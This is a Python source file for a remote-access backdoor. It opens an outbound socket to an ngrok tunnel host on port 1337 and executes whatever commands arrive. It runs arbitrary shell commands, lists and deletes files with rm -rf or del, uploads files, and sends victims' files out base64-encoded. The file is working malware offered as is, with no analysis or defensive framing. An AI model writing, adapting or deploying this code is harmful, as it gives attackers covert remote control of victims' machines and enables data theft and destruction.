import socket
import json
import subprocess
import os
import base64

class Backdoor:
    def __init__(self, target, port):
        self.port = port
        self.target = target
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self):
        try:
            self.connection.connect((self.target, self.port))
            print("[+] Connected to the target.")
        except ConnectionRefusedError:
            print("[-] Connection refused. Make sure the server is running.")
            exit(1)
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            exit(1)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                received_data = self.connection.recv(1024)
                if not received_data:
                    break
                json_data += received_data
                return json.loads(json_data.decode())
            except ValueError:
                return "[-] Error during command execution."

    def execute_system_command(self, command):
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            return result.decode()
        except subprocess.CalledProcessError as e:
            return str(e.stderr.decode())

    def change_directory(self, path):
        try:
            os.chdir(path)
            return "[+] Changing working directory to " + os.getcwd()
        except:
            return "[-] Directory not found: " + path

    def read_file(self, path):
        if os.path.isfile(path):
            with open(path, "rb") as f:
                return base64.b64encode(f.read()).decode()
        else:
            return f"[-] {path} not found"

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
        return "[+] Upload successful."

    def remove(self, path):
        if os.path.exists(path):
            os.system(f'del -Force {path}' if os.name == 'nt' else f'rm -rf {path}')
            return f"[+] {path} deleted"
        else:
            return f"[-] {path} not found"

    def run(self):
        self.connect()
        while True:
            command = str(self.reliable_receive())
            command = command.split()
            try:
                if command[0] == "exit":
                    print("exit")
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_directory(command[1])
                elif command[0] == "rm" and len(command) > 1:
                    command_result = self.remove(command[1])
                elif command[0] == "ls":
                    command_result = subprocess.check_output('dir' if os.name == 'nt' else 'ls -la', shell=True, text=True)
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], " ".join(command[2:]))
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error during command execution."

            print(command_result)
            self.reliable_send(command_result)

my_backdoor = Backdoor("0.tcp.eu.ngrok.io", 1337)
#my_backdoor = Backdoor("LHOST", 1337)
my_backdoor.run()
